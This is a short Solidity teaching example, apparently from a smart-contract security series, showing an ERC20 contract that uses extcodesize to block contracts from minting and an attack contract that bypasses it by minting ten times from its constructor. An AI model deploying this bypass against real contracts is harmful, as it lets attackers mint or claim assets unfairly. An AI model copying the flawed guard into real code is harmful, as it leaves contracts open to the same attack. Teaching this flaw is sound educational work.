// SPDX-License-Identifier: MIT
// english translation by 22X
pragma solidity ^0.8.21;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Check if an address is a contract using extcodesize
contract ContractCheck is ERC20 {
    // Constructor: Initialize token name and symbol
    constructor() ERC20("", "") {}
    
    // Use extcodesize to check if it's a contract
    function isContract(address account) public view returns (bool) {
        // Addresses with extcodesize > 0 are definitely contract addresses
        // However, during contract construction, extcodesize is 0
        uint size;
        assembly {
          size := extcodesize(account)
        }
        return size > 0;
    }

    // mint function, only callable by non-contract addresses (vulnerable)
    function mint() public {
        require(!isContract(msg.sender), "Contract not allowed!");
        _mint(msg.sender, 100);
    }
}

// Attack using constructor's behavior
contract NotContract {
    bool public isContract;
    address public contractCheck;

    // When the contract is being created, extcodesize (code length) is 0, so it won't be detected by isContract().
    constructor(address addr) {
        contractCheck = addr;
        isContract = ContractCheck(addr).isContract(address(this));
        // This will work
        for(uint i; i < 10; i++){
            ContractCheck(addr).mint();
        }
    }

    // After the contract is created, extcodesize > 0, isContract() can detect it
    function mint() external {
        ContractCheck(contractCheck).mint();
    }
}
